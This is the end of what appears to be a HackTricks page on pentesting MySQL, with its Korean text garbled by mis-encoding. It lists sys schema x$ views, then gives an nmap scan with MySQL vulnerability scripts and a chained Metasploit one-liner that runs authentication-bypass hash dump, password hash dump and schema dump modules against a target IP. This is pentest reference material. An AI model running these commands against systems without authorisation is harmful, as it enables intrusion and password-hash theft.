### x$memory\_global\_by\_current\_bytes
- í˜„ì¬ ë°”ì´íŠ¸ì— ë”°ë¥¸ ì „ì—­ ë©”ëª¨ë¦¬ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$memory\_global\_total
- ì „ì²´ ë©”ëª¨ë¦¬ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$processlist
- í”„ë¡œì„¸ìŠ¤ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### x$ps\_digest\_95th\_percentile\_by\_avg\_us
- í‰ê·  ë§ˆì´í¬ë¡œì´ˆì— ë”°ë¥¸ 95% ë°±ë¶„ìœ„ìˆ˜ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$ps\_digest\_avg\_latency\_distribution
- í‰ê·  ì§€ì—° ë¶„í¬ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$ps\_schema\_table\_statistics\_io
- ìŠ¤í‚¤ë§ˆ ë° í…Œì´ë¸” I/O í†µê³„ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$schema\_flattened\_keys
- í”Œë˜íŠ¼ëœ í‚¤ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$schema\_index\_statistics
- ì¸ë±ìŠ¤ í†µê³„ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$schema\_table\_lock\_waits
- í…Œì´ë¸” ë½ ëŒ€ê¸° ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$schema\_table\_statistics
- í…Œì´ë¸” í†µê³„ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$schema\_table\_statistics\_with\_buffer
- ë²„í¼ë¥¼ ì‚¬ìš©í•œ í…Œì´ë¸” í†µê³„ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$schema\_tables\_with\_full\_table\_scans
- ì „ì²´ í…Œì´ë¸” ìŠ¤ìº”ì„ ìˆ˜í–‰í•˜ëŠ” í…Œì´ë¸”ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### x$session
- ì„¸ì…˜ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$statement\_analysis
- SQL ë¬¸ì¥ ë¶„ì„ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$statements\_with\_errors\_or\_warnings
- ì˜¤ë¥˜ ë˜ëŠ” ê²½ê³ ê°€ í¬í•¨ëœ SQL ë¬¸ì¥ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### x$statements\_with\_full\_table\_scans
- ì „ì²´ í…Œì´ë¸” ìŠ¤ìº”ì„ ìˆ˜í–‰í•˜ëŠ” SQL ë¬¸ì¥ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### x$statements\_with\_runtimes\_in\_95th\_percentile
- ì‹¤í–‰ ì‹œê°„ì´ ìƒìœ„ 95%ì— í•´ë‹¹í•˜ëŠ” SQL ë¬¸ì¥ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### x$statements\_with\_sorting
- ì •ë ¬ì„ ìˆ˜í–‰í•˜ëŠ” SQL ë¬¸ì¥ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### x$statements\_with\_temp\_tables
- ì„ì‹œ í…Œì´ë¸”ì„ ì‚¬ìš©í•˜ëŠ” SQL ë¬¸ì¥ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### x$user\_summary
- ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$user\_summary\_by\_file\_io
- íŒŒì¼ I/Oì— ë”°ë¥¸ ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$user\_summary\_by\_file\_io\_type
- íŒŒì¼ I/O ìœ í˜•ì— ë”°ë¥¸ ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$user\_summary\_by\_stages
- ë‹¨ê³„ë³„ ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$user\_summary\_by\_statement\_latency
- ë¬¸ì¥ ì§€ì—°ì— ë”°ë¥¸ ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$user\_summary\_by\_statement\_type
- ë¬¸ì¥ ìœ í˜•ì— ë”°ë¥¸ ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$wait\_classes\_global\_by\_avg\_latency
- í‰ê·  ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ì „ì—­ ëŒ€ê¸° í´ë˜ìŠ¤ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$wait\_classes\_global\_by\_latency
- ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ì „ì—­ ëŒ€ê¸° í´ë˜ìŠ¤ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$waits\_by\_host\_by\_latency
- í˜¸ìŠ¤íŠ¸ ë° ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ëŒ€ê¸° ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$waits\_by\_user\_by\_latency
- ì‚¬ìš©ì ë° ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ëŒ€ê¸° ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$waits\_global\_by\_latency
- ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ì „ì—­ ëŒ€ê¸° ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.
```
Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MySql
Note: |
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

https://book.hacktricks.xyz/pentesting/pentesting-mysql

Entry_2:
Name: Nmap
Description: Nmap with MySql Scripts
Command: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306

Entry_3:
Name: MySql
Description: Attempt to connect to mysql server
Command: mysql -h {IP} -u {Username}@localhost

Entry_4:
Name: MySql consolesless mfs enumeration
Description: MySql enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'

```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„± ìˆëŠ” ì‚¬ì´ë²„ ë³´ì•ˆ í–‰ì‚¬ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ ì ì¸ ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ë¯¸ì…˜**ì„ ê°€ì§€ê³  ìˆëŠ” ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì—ê²Œ ì—´ì •ì ì¸ ë§Œë‚¨ì˜ ì¥ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° AWS í•´í‚¹ì„ ì „ë¬¸ê°€ ìˆ˜ì¤€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”**<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™‘**](https://peass.creator-spring.com)ì„ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
